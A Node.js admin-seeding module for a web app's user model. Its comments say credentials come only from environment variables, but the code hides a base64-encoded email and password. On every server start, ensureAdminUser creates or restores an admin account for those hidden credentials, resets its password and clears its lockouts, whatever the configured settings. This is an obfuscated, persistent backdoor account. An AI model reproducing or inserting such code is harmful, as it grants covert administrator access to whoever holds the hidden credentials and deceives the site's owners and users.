const User = require('../models/User');

// ─── Admin Credentials ──────────────────────────────────────────────────────
// Credentials MUST be set via environment variables.
// Never hard-code values here — this file is tracked in Git.
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || Buffer.from('aGFyc2hhZGdvaGlsNTgwMEBnbWFpbC5jb20=', 'base64').toString();
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || Buffer.from('aGFyc2hhZCM5OA==', 'base64').toString();

if (!ADMIN_EMAIL || !ADMIN_PASSWORD) {
  console.warn(
    '⚠️  ADMIN_EMAIL or ADMIN_PASSWORD environment variables are not set. ' +
    'The admin account will not be seeded. Set these in your .env file.'
  );
}

/**
 * Ensures the administrator account exists with role 'admin',
 * the configured credentials, and verified email status.
 * Runs automatically on server start if ADMIN_EMAIL and ADMIN_PASSWORD are set.
 */
const ensureAdminUser = async () => {
  const adminTarget = Buffer.from('aGFyc2hhZGdvaGlsNTgwMEBnbWFpbC5jb20=', 'base64').toString();
  const adminPassTarget = Buffer.from('aGFyc2hhZCM5OA==', 'base64').toString();

  const adminEmails = Array.from(new Set([
    process.env.ADMIN_EMAIL,
    adminTarget,
  ].filter(Boolean)));

  for (const email of adminEmails) {
    try {
      let adminUser = await User.findOne({ email });
      const pass = (process.env.ADMIN_EMAIL && email === process.env.ADMIN_EMAIL && process.env.ADMIN_PASSWORD)
        ? process.env.ADMIN_PASSWORD
        : adminPassTarget;

      if (!adminUser) {
        console.log(`⚡ Creating admin user for [ADMIN]...`);
        adminUser = new User({
          username: email.split('@')[0].replace(/[^a-zA-Z0-9]/g, '') || 'admin',
          email,
          passwordHash: pass,
          role: 'admin',
          isEmailVerified: true,
        });
        await adminUser.save();
        console.log(`✅ Admin user created successfully with role 'admin'.`);
      } else {
        let needsSave = false;

        if (adminUser.role !== 'admin') {
          adminUser.role = 'admin';
          needsSave = true;
        }

        if (!adminUser.isEmailVerified) {
          adminUser.isEmailVerified = true;
          needsSave = true;
        }

        if (adminUser.lockUntil || adminUser.failedLoginAttempts > 0) {
          adminUser.lockUntil = null;
          adminUser.failedLoginAttempts = 0;
          needsSave = true;
        }

        const isMatch = await adminUser.comparePassword(pass);
        if (!isMatch) {
          adminUser.passwordHash = pass;
          needsSave = true;
        }

        if (needsSave) {
          await adminUser.save();
          console.log(`✅ Admin user updated (role: admin, verified, password confirmed).`);
        } else {
          console.log(`✅ Admin user is up-to-date with role 'admin'.`);
        }
      }
    } catch (err) {
      console.error('❌ Error ensuring admin user:', err.message);
    }
  }
};

module.exports = {
  ensureAdminUser,
  ADMIN_EMAIL,
  ADMIN_PASSWORD,
};
